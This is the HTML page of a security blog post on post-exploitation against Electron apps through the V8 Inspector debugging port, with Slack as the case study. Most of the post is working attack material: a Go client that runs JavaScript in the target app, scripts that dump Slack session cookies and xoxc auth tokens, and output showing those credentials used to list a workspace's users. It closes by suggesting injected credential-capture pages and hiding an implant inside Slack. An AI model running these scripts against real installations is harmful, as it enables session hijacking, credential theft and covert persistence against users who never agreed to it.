<!DOCTYPE html><html lang="en" mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="day-prompt" content="days ago"><meta name="hour-prompt" content="hours ago"><meta name="minute-prompt" content="minutes ago"><meta name="justnow-prompt" content="just now"><meta name="generator" content="Jekyll v4.2.1" /><meta property="og:title" content="Looting Electron Apps Via The V8 Inspector" /><meta name="author" content="actae0n" /><meta property="og:locale" content="en" /><meta name="description" content="What Is The V8 Inspector? V8 is the JavaScript engine that ships as part of both Chromium (and derivatives) as well as Node (which is in turn included in Electron). V8 provides a debugging interface that implements a subset of the Chrome DevTools Protocol (hereafter referred to as CDP). In Chromium, Chrome, and other Blink based browsers, methods from all Domains of CDP are exposed through the stub (see the “tip-of-tree” or “stable” protocol versions). This will include methods to interface with some of the browser-oriented elements, such as the DOM, page, etc. However, in Electron applications, we’re targeting the Node environment. This relegates us to a smaller subset of the CDP (v8-inspector (node))." /><meta property="og:description" content="What Is The V8 Inspector? V8 is the JavaScript engine that ships as part of both Chromium (and derivatives) as well as Node (which is in turn included in Electron). V8 provides a debugging interface that implements a subset of the Chrome DevTools Protocol (hereafter referred to as CDP). In Chromium, Chrome, and other Blink based browsers, methods from all Domains of CDP are exposed through the stub (see the “tip-of-tree” or “stable” protocol versions). This will include methods to interface with some of the browser-oriented elements, such as the DOM, page, etc. However, in Electron applications, we’re targeting the Node environment. This relegates us to a smaller subset of the CDP (v8-inspector (node))." /><link rel="canonical" href="https://blacksunhackers.club/posts/Looting-Electron-Apps-Via-V8-Inspector/" /><meta property="og:url" content="https://blacksunhackers.club/posts/Looting-Electron-Apps-Via-V8-Inspector/" /><meta property="og:site_name" content="Blacksun Hackers Club" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2021-08-29T00:00:00+08:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Looting Electron Apps Via The V8 Inspector" /><meta name="twitter:site" content="@BlacksunLabs_" /><meta name="twitter:creator" content="@https://twitter.com/actae0n" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"author":{"@type":"Person","name":"actae0n"},"description":"What Is The V8 Inspector? V8 is the JavaScript engine that ships as part of both Chromium (and derivatives) as well as Node (which is in turn included in Electron). V8 provides a debugging interface that implements a subset of the Chrome DevTools Protocol (hereafter referred to as CDP). In Chromium, Chrome, and other Blink based browsers, methods from all Domains of CDP are exposed through the stub (see the “tip-of-tree” or “stable” protocol versions). This will include methods to interface with some of the browser-oriented elements, such as the DOM, page, etc. However, in Electron applications, we’re targeting the Node environment. This relegates us to a smaller subset of the CDP (v8-inspector (node)).","url":"https://blacksunhackers.club/posts/Looting-Electron-Apps-Via-V8-Inspector/","@type":"BlogPosting","headline":"Looting Electron Apps Via The V8 Inspector","dateModified":"2021-09-12T03:17:07+08:00","datePublished":"2021-08-29T00:00:00+08:00","mainEntityOfPage":{"@type":"WebPage","@id":"https://blacksunhackers.club/posts/Looting-Electron-Apps-Via-V8-Inspector/"},"@context":"https://schema.org"}</script><title>Looting Electron Apps Via The V8 Inspector | Blacksun Hackers Club</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Blacksun Hackers Club"><meta name="application-name" content="Blacksun Hackers Club"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end" lang=""><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="/images/bsh_logo.jpeg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Blacksun Hackers Club</a></div><div class="site-subtitle font-italic">Just a bunch of hackers doing what we find fun.</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center"> <a href="https://github.com/BlacksunLabs" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a> <a href="https://twitter.com/BlacksunLabs_" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>Looting Electron Apps Via The V8 Inspector</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Looting Electron Apps Via The V8 Inspector</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="semi-bold"> Written by <a href=https://twitter.com/actae0n> <b>actae0n</b> </a> </span> on <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Sun, Aug 29, 2021, 12:00 AM +0800" >Aug 29, 2021<i class="unloaded">2021-08-29T00:00:00+08:00</i> </span></div><div> <span> Updated <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="Sat, Sep 11, 2021, 12:17 PM -0700" >Sep 11, 2021<i class="unloaded">2021-09-12T03:17:07+08:00</i> </span> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1352 words">7 min read</span></div></div><div class="post-content"><h2 id="what-is-the-v8-inspector">What Is The V8 Inspector?</h2><p>V8 is the JavaScript engine that ships as part of both Chromium (and derivatives) as well as Node (which is in turn included in Electron). V8 provides a <a href="https://v8.dev/docs/inspector">debugging interface</a> that implements a subset of the Chrome DevTools Protocol (hereafter referred to as CDP). In Chromium, Chrome, and other Blink based browsers, methods from all Domains of CDP are exposed through the stub (see the <a href="https://chromedevtools.github.io/devtools-protocol/tot/">“tip-of-tree”</a> or <a href="https://chromedevtools.github.io/devtools-protocol/1-2/">“stable”</a> protocol versions). This will include methods to interface with some of the browser-oriented elements, such as the DOM, page, etc. However, in Electron applications, we’re targeting the Node environment. This relegates us to a smaller subset of the CDP (<a href="https://chromedevtools.github.io/devtools-protocol/v8/">v8-inspector (node)</a>).</p><h2 id="how-is-this-useful">How Is This Useful?</h2><p>Many Electron applications ship with the command-line option to <a href="https://www.electronjs.org/docs/tutorial/debugging-main-process">enable the V8 Inspector at startup</a>, binding it to a local port. We can then connect to this port and perform introspection and manipulation on the target application, extracting secrets along the way. We’ll use Slack as a case study in this post, extracting the AuthN token and cookie.</p><h2 id="starting-the-inspector">Starting The Inspector</h2><p>To launch the target with the V8 Inspector enabled, we can use the <code class="language-plaintext highlighter-rouge">--inspect</code> option. Many Electron applications have this enabled (e.g <a href="https://www.ledger.com/ledger-live">Ledger Live</a>), just give it a shot on your favorites. In the below example, we’re launching Slack on MacOS.</p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre>$ /Applications/Slack.app/Contents/MacOS/Slack --inspect

Debugger listening on ws://127.0.0.1:9229/b84df45f-b494-4e18-b77c-d8ed8f34c44d
For help, see: https://nodejs.org/en/docs/inspector
Initializing local storage instance
(node:82531) [DEP0005] DeprecationWarning: Buffer() is deprecated due to security and usability issues. Please use the Buffer.alloc(), Buffer.allocUnsafe(), or Buffer.from() methods instead.
(Use `Slack --trace-deprecation ...` to show where the warning was created)
[08/29/21, 19:12:21:841] info:
╔══════════════════════════════════════════════════════╗
║      Slack 4.18.0, darwin (Store) 20.6.0 on x64      ║
╚══════════════════════════════════════════════════════╝
</pre></table></code></div></div><h2 id="speaking-the-protocol">Speaking The Protocol</h2><p>Luckily for us, <a href="https://github.com/mafredri/cdp">Golang bindings</a> for the CDP are available. This should allow us to invoke methods on the target with fairly little code.</p><p>While the full CDP exposes some gnarly stuff (<a href="https://mango.pdf.zone/stealing-chrome-cookies-without-a-password">see MangoPDF’s usage of Network.getAllCookies</a>), the bulk of those methods are not exposed in the Node version. For example, if you attempt to invoke the <code class="language-plaintext highlighter-rouge">Network.GetAllCookies</code> method, you’ll get an RPC error: <code class="language-plaintext highlighter-rouge">GetAllCookies: rpc error: 'Network.getAllCookies' wasn't found (code = -32601)</code>).</p><p>However, the <code class="language-plaintext highlighter-rouge">Runtime</code> domain exposes something even more powerful, direct access to the JavaScript VM that’s running in the target. Using the <code class="language-plaintext highlighter-rouge">Runtime.evaluate</code> method (or the pair of <code class="language-plaintext highlighter-rouge">Runtime.compileScript</code> and <code class="language-plaintext highlighter-rouge">Runtime.runScript</code>), we can execute JavaScript snippets within the context of the Electron application. We can execute some JS snippets remotely with some short PoC code:</p><div lang="go" class="language-go highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
</pre><td class="rouge-code"><pre><span class="k">func</span> <span class="n">main</span><span class="p">()</span> <span class="p">{</span>
	<span class="n">scriptPath</span> <span class="o">:=</span> <span class="n">flag</span><span class="o">.</span><span class="n">String</span><span class="p">(</span><span class="s">"script"</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">"Path to JS script to evaluate in the target"</span><span class="p">)</span>
	<span class="n">inspectTarget</span> <span class="o">:=</span> <span class="n">flag</span><span class="o">.</span><span class="n">String</span><span class="p">(</span><span class="s">"inspect-target"</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">"V8 inspector listener"</span><span class="p">)</span>
	<span class="n">flag</span><span class="o">.</span><span class="n">Parse</span><span class="p">()</span>
	<span class="k">if</span> <span class="o">*</span><span class="n">inspectTarget</span> <span class="o">==</span> <span class="s">""</span> <span class="p">{</span>
		<span class="n">log</span><span class="o">.</span><span class="n">Fatalf</span><span class="p">(</span><span class="s">"Must specify inspector target"</span><span class="p">)</span>
	<span class="p">}</span>
	<span class="k">if</span> <span class="o">*</span><span class="n">scriptPath</span> <span class="o">==</span> <span class="s">""</span> <span class="p">{</span>
		<span class="n">log</span><span class="o">.</span><span class="n">Fatalf</span><span class="p">(</span><span class="s">"Must specify script payload"</span><span class="p">)</span>
	<span class="p">}</span>

	<span class="n">scriptData</span><span class="p">,</span> <span class="n">err</span> <span class="o">:=</span> <span class="n">ioutil</span><span class="o">.</span><span class="n">ReadFile</span><span class="p">(</span><span class="o">*</span><span class="n">scriptPath</span><span class="p">)</span>
	<span class="k">if</span> <span class="n">err</span> <span class="o">!=</span> <span class="no">nil</span> <span class="p">{</span>
		<span class="nb">panic</span><span class="p">(</span><span class="n">err</span><span class="p">)</span>
	<span class="p">}</span>

	<span class="n">ctx</span><span class="p">,</span> <span class="n">cancel</span> <span class="o">:=</span> <span class="n">context</span><span class="o">.</span><span class="n">WithTimeout</span><span class="p">(</span><span class="n">context</span><span class="o">.</span><span class="n">Background</span><span class="p">(),</span> <span class="m">5</span><span class="o">*</span><span class="n">time</span><span class="o">.</span><span class="n">Second</span><span class="p">)</span>
	<span class="k">defer</span> <span class="n">cancel</span><span class="p">()</span>
	<span class="n">devt</span> <span class="o">:=</span> <span class="n">devtool</span><span class="o">.</span><span class="n">New</span><span class="p">(</span><span class="o">*</span><span class="n">inspectTarget</span><span class="p">)</span>
	<span class="n">pt</span><span class="p">,</span> <span class="n">err</span> <span class="o">:=</span> <span class="n">devt</span><span class="o">.</span><span class="n">Get</span><span class="p">(</span><span class="n">ctx</span><span class="p">,</span> <span class="n">devtool</span><span class="o">.</span><span class="n">Node</span><span class="p">)</span>
	<span class="k">if</span> <span class="n">err</span> <span class="o">!=</span> <span class="no">nil</span> <span class="p">{</span>
		<span class="nb">panic</span><span class="p">(</span><span class="n">err</span><span class="p">)</span>
	<span class="p">}</span>
	<span class="n">conn</span><span class="p">,</span> <span class="n">err</span> <span class="o">:=</span> <span class="n">rpcc</span><span class="o">.</span><span class="n">DialContext</span><span class="p">(</span><span class="n">ctx</span><span class="p">,</span> <span class="n">pt</span><span class="o">.</span><span class="n">WebSocketDebuggerURL</span><span class="p">)</span>
	<span class="k">if</span> <span class="n">err</span> <span class="o">!=</span> <span class="no">nil</span> <span class="p">{</span>
		<span class="nb">panic</span><span class="p">(</span><span class="n">err</span><span class="p">)</span>
	<span class="p">}</span>
	<span class="k">defer</span> <span class="n">conn</span><span class="o">.</span><span class="n">Close</span><span class="p">()</span>
	<span class="n">c</span> <span class="o">:=</span> <span class="n">cdp</span><span class="o">.</span><span class="n">NewClient</span><span class="p">(</span><span class="n">conn</span><span class="p">)</span>

	<span class="n">eval</span> <span class="o">:=</span> <span class="n">runtime</span><span class="o">.</span><span class="n">NewEvaluateArgs</span><span class="p">(</span><span class="kt">string</span><span class="p">(</span><span class="n">scriptData</span><span class="p">))</span>
	<span class="n">eval</span><span class="o">.</span><span class="n">AwaitPromise</span> <span class="o">=</span> <span class="n">BoolAddr</span><span class="p">(</span><span class="no">true</span><span class="p">)</span>
	<span class="n">eval</span><span class="o">.</span><span class="n">ReplMode</span> <span class="o">=</span> <span class="n">BoolAddr</span><span class="p">(</span><span class="no">true</span><span class="p">)</span>
	<span class="n">reply</span><span class="p">,</span> <span class="n">err</span> <span class="o">:=</span> <span class="n">c</span><span class="o">.</span><span class="n">Runtime</span><span class="o">.</span><span class="n">Evaluate</span><span class="p">(</span><span class="n">context</span><span class="o">.</span><span class="n">Background</span><span class="p">(),</span> <span class="n">eval</span><span class="p">)</span>
	<span class="k">if</span> <span class="n">err</span> <span class="o">!=</span> <span class="no">nil</span> <span class="p">{</span>
		<span class="nb">panic</span><span class="p">(</span><span class="n">err</span><span class="p">)</span>
	<span class="p">}</span>

	<span class="k">if</span> <span class="n">reply</span><span class="o">.</span><span class="n">ExceptionDetails</span> <span class="o">!=</span> <span class="no">nil</span> <span class="p">{</span>
		<span class="c">// Dump the exception details if the script run was unsuccessful</span>
		<span class="n">log</span><span class="o">.</span><span class="n">Fatalf</span><span class="p">(</span><span class="s">"Exception(line %d, col %d): %v</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">reply</span><span class="o">.</span><span class="n">ExceptionDetails</span><span class="o">.</span><span class="n">LineNumber</span><span class="p">,</span> <span class="n">reply</span><span class="o">.</span><span class="n">ExceptionDetails</span><span class="o">.</span><span class="n">ColumnNumber</span><span class="p">,</span> <span class="n">reply</span><span class="o">.</span><span class="n">ExceptionDetails</span><span class="o">.</span><span class="n">Exception</span><span class="p">)</span>
	<span class="p">}</span>

	<span class="c">// discarding the error result, failure doesn't matter.</span>
	<span class="c">// This will just handle cases where string results come</span>
	<span class="c">// back doubled escaped, causing parsing issues in follow-up</span>
	<span class="c">// tools like `jq`</span>
	<span class="n">s</span><span class="p">,</span> <span class="n">_</span> <span class="o">:=</span> <span class="n">strconv</span><span class="o">.</span><span class="n">Unquote</span><span class="p">(</span><span class="kt">string</span><span class="p">((</span><span class="o">*</span><span class="n">reply</span><span class="p">)</span><span class="o">.</span><span class="n">Result</span><span class="o">.</span><span class="n">Value</span><span class="p">))</span>

	<span class="n">fmt</span><span class="o">.</span><span class="n">Printf</span><span class="p">(</span><span class="s">"%s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">s</span><span class="p">)</span>
<span class="p">}</span>
</pre></table></code></div></div><p>For the full code with the example scripts, check out <a href="https://github.com/xpcmdshell/electron-probe">electron-probe</a>.</p><h2 id="building-something-useful">Building Something Useful</h2><p>Particularly of interest are the <a href="https://www.electronjs.org/docs/api/session">Session API</a> and the <a href="https://www.electronjs.org/docs/api/web-contents">WebContents API</a>.</p><p>Let’s get a handle to the Electron runtime, so that we can access all the methods <a href="https://www.electronjs.org/docs/api">included in its API</a>:</p><div lang="js" class="language-js highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nx">electron</span> <span class="o">=</span> <span class="nx">process</span><span class="p">.</span><span class="nx">mainModule</span><span class="p">.</span><span class="nx">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">electron</span><span class="dl">'</span><span class="p">);</span>
</pre></table></code></div></div><p>First up, using the Session API we can get access to the cookie storage of the current session(<code class="language-plaintext highlighter-rouge">defaultSession</code>):</p><div lang="js" class="language-js highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="c1">// dump_slack_cookies.js</span>
<span class="nx">electron</span> <span class="o">=</span> <span class="nx">process</span><span class="p">.</span><span class="nx">mainModule</span><span class="p">.</span><span class="nx">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">electron</span><span class="dl">'</span><span class="p">);</span>
<span class="nx">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">((</span><span class="k">await</span> <span class="nx">electron</span><span class="p">.</span><span class="nx">session</span><span class="p">.</span><span class="nx">defaultSession</span><span class="p">.</span><span class="nx">cookies</span><span class="p">.</span><span class="kd">get</span><span class="p">({})))</span>
</pre></table></code></div></div><p>You may notice that we used <code class="language-plaintext highlighter-rouge">JSON.stringify</code> on the result. Getting values out of the V8 VM can be finicky, depending on the object type returned. I’m resorting to pulling out objects as strings of JSON for easy parsing. For more robust handling of different object types being returned, see <code class="language-plaintext highlighter-rouge">Runtime.getProperties</code> and <code class="language-plaintext highlighter-rouge">Runtime.queryObjects</code>.</p><p>Running the result, it appears to work:</p><div lang="shell" class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
</pre><td class="rouge-code"><pre><span class="nv">$ </span>./electron-probe <span class="nt">-inspect-target</span> http://localhost:9229 <span class="nt">-script</span> scripts/dump_slack_cookies.js | jq 

<span class="o">[</span>
  <span class="o">[</span>... SNIP]
    <span class="o">{</span>
    <span class="s2">"name"</span>: <span class="s2">"ssb_instance_id"</span>,
    <span class="s2">"value"</span>: <span class="s2">"90d5538e- [ REDACTED ]"</span>,
    <span class="s2">"domain"</span>: <span class="s2">".slack.com"</span>,
    <span class="s2">"hostOnly"</span>: <span class="nb">false</span>,
    <span class="s2">"path"</span>: <span class="s2">"/"</span>,
    <span class="s2">"secure"</span>: <span class="nb">false</span>,
    <span class="s2">"httpOnly"</span>: <span class="nb">false</span>,
    <span class="s2">"session"</span>: <span class="nb">false</span>,
    <span class="s2">"expirationDate"</span>: 1945639889,
    <span class="s2">"sameSite"</span>: <span class="s2">"unspecified"</span>
  <span class="o">}</span>,
  <span class="o">{</span>
    <span class="s2">"name"</span>: <span class="s2">"d"</span>,
    <span class="s2">"value"</span>: <span class="s2">"aX9QnD8F [ REDACTED ]"</span>,
    <span class="s2">"domain"</span>: <span class="s2">".slack.com"</span>,
    <span class="s2">"hostOnly"</span>: <span class="nb">false</span>,
    <span class="s2">"path"</span>: <span class="s2">"/"</span>,
    <span class="s2">"secure"</span>: <span class="nb">true</span>,
    <span class="s2">"httpOnly"</span>: <span class="nb">true</span>,
    <span class="s2">"session"</span>: <span class="nb">false</span>,
    <span class="s2">"expirationDate"</span>: 1941391182.507454,
    <span class="s2">"sameSite"</span>: <span class="s2">"lax"</span>
  <span class="o">}</span>,
 <span class="o">[</span>...SNIP]
<span class="o">]</span>
</pre></table></code></div></div><p>We’ve extracted the <code class="language-plaintext highlighter-rouge">d</code> cookie value from a running Slack instance. This is half of the material we need to steal a session.</p><hr /><p>Next, let’s work on lifting out the user token that goes with that cookie. The token is submitted with every request in the request body, and begins with <code class="language-plaintext highlighter-rouge">xoxc-</code>. It should be accessible via the <code class="language-plaintext highlighter-rouge">localConfig_v2</code> key in Local Storage:</p><div lang="js" class="language-js highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
</pre><td class="rouge-code"><pre><span class="c1">// dump_slack_tokens.js</span>
<span class="c1">// Get a handle to the Electron APIs</span>
<span class="nx">electron</span> <span class="o">=</span> <span class="nx">process</span><span class="p">.</span><span class="nx">mainModule</span><span class="p">.</span><span class="nx">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">electron</span><span class="dl">'</span><span class="p">);</span>

<span class="c1">// Get the first WebContents instance that we can access the associated Local Storage</span>
<span class="nb">window</span> <span class="o">=</span> <span class="nx">electron</span><span class="p">.</span><span class="nx">webContents</span><span class="p">.</span><span class="nx">getAllWebContents</span><span class="p">()[</span><span class="mi">0</span><span class="p">];</span>

<span class="c1">// We have to go one level deeper. Using javascript execution in Electron's V8 runtime, we</span>
<span class="c1">// will in turn trigger javascript execution in the target window.</span>
<span class="c1">// Look, I'm not proud of it either. </span>
<span class="kd">let</span> <span class="nx">config_blob</span> <span class="o">=</span> <span class="k">await</span> <span class="nb">window</span><span class="p">.</span><span class="nx">executeJavaScript</span><span class="p">(</span><span class="dl">'</span><span class="s1">localStorage.localConfig_v2</span><span class="dl">'</span><span class="p">);</span>

<span class="c1">// Shave off the cruft and make a nice object to stringify that just contains the </span>
<span class="c1">// workspace name and the associated token.</span>
<span class="kd">let</span> <span class="nx">config_obj</span> <span class="o">=</span> <span class="nx">JSON</span><span class="p">.</span><span class="nx">parse</span><span class="p">(</span><span class="nx">config_blob</span><span class="p">);</span>
<span class="kd">let</span> <span class="nx">teams</span> <span class="o">=</span> <span class="nb">Object</span><span class="p">.</span><span class="nx">values</span><span class="p">(</span><span class="nx">config_obj</span><span class="p">.</span><span class="nx">teams</span><span class="p">)</span>
<span class="kd">let</span> <span class="nx">extracted_teams</span> <span class="o">=</span> <span class="p">[];</span>

<span class="nx">teams</span><span class="p">.</span><span class="nx">forEach</span><span class="p">(</span><span class="nx">e</span> <span class="o">=&gt;</span> <span class="p">{</span>
  <span class="nx">extracted_teams</span><span class="p">.</span><span class="nx">push</span><span class="p">({</span>
    <span class="dl">'</span><span class="s1">name</span><span class="dl">'</span><span class="p">:</span> <span class="nx">e</span><span class="p">.</span><span class="nx">name</span><span class="p">,</span>
    <span class="dl">'</span><span class="s1">token</span><span class="dl">'</span><span class="p">:</span> <span class="nx">e</span><span class="p">.</span><span class="nx">token</span>
  <span class="p">})</span>
<span class="p">});</span>

<span class="nx">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">(</span><span class="nx">extracted_teams</span><span class="p">)</span>
</pre></table></code></div></div><p>Let’s see what we got:</p><div lang="shell" class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre><td class="rouge-code"><pre><span class="nv">$ </span>./electron-probe <span class="nt">-inspect-target</span> http://localhost:9229 <span class="nt">-script</span> scripts/dump_slack_tokens.js | jq

<span class="o">[</span>
  <span class="o">{</span>
    <span class="s2">"name"</span>: <span class="s2">"r2c"</span>,
    <span class="s2">"token"</span>: <span class="s2">"xoxc-65630S1[ REDACTED ]"</span>
  <span class="o">}</span>,
  <span class="o">{</span>
    <span class="s2">"name"</span>: <span class="s2">"Binary Ninja Public Chat"</span>,
    <span class="s2">"token"</span>: <span class="s2">"xoxc-1300035[ REDACTED ]"</span>
  <span class="o">}</span>, 
  <span class="o">[</span> SNIP <span class="o">]</span>
<span class="o">]</span>
</pre></table></code></div></div><h2 id="using-the-credentials">Using The Credentials</h2><p>Now we have both the <code class="language-plaintext highlighter-rouge">d</code> cookie as well as the <code class="language-plaintext highlighter-rouge">xoxc</code> token required to authenticate as our target user. We can use these credentials together to access the Slack API as the target user. For example, we can use <a href="https://github.com/xpcmdshell/slarf">Slarf</a> to dump the user directory for a workspace:</p><div lang="shell" class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="nv">$ </span>./slarf <span class="nt">-cookie</span> aX9QnD8F[REDACT] <span class="nt">-token</span> xoxc-1300035[REDACT] | jq <span class="s1">'.[].name'</span>
<span class="s2">"slackbot"</span>
<span class="s2">"actae0n"</span>
<span class="o">[</span> SNIP <span class="o">]</span>
</pre></table></code></div></div><h2 id="rapid-js-payload-prototyping">Rapid JS Payload Prototyping</h2><p>If you want a nicer environment to develop your JS payloads in, I’d recommend using the Chrome/Chromium/Brave DevTools to talk to the Inspector. Once the target application has been launched with the Inspector listening, you can attach to it by navigating to <code class="language-plaintext highlighter-rouge">chrome://inspect</code>.</p><p><img data-proofer-ignore data-src="https://blacksunhackers.club/images/electron_loot/devtools_remote.png" alt="chrome://inspect" /></p><p>In the <code class="language-plaintext highlighter-rouge">Remote Target (localhost)</code> section, you should see your target listed. You can click the <code class="language-plaintext highlighter-rouge">inspect</code> button to open DevTools for your target.</p><p><img data-proofer-ignore data-src="https://blacksunhackers.club/images/electron_loot/devtools_env.png" alt="DevTools For Electron" /></p><h2 id="additional-ideas">Additional Ideas</h2><p>Since you have direct access to the WebContents object, you could rewrite the DOM or redirect at will (e.g embedding a credential capture page) by loading content with <code class="language-plaintext highlighter-rouge">WebContents.loadURL()</code>. Check out the <code class="language-plaintext highlighter-rouge">inline_content.js</code> and <code class="language-plaintext highlighter-rouge">redirect.js</code> scripts for examples of this.</p><p>Electron also has some support (albeit unsafe) for loading Node extensions at runtime using <code class="language-plaintext highlighter-rouge">process.dlopen()</code>, however I didn’t explore this. Using Slack as a host for your implant would be nice though!</p></div><div class="post-tail-wrapper text-muted"><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/macos/" class="post-tag no-text-decoration" >MacOS</a> <a href="/tags/post-exploitation/" class="post-tag no-text-decoration" >Post-Exploitation</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"></div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Looting Electron Apps Via The V8 Inspector - Blacksun Hackers Club&url=https://blacksunhackers.club/posts/Looting-Electron-Apps-Via-V8-Inspector/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Looting Electron Apps Via The V8 Inspector - Blacksun Hackers Club&u=https://blacksunhackers.club/posts/Looting-Electron-Apps-Via-V8-Inspector/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=Looting Electron Apps Via The V8 Inspector - Blacksun Hackers Club&url=https://blacksunhackers.club/posts/Looting-Electron-Apps-Via-V8-Inspector/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" 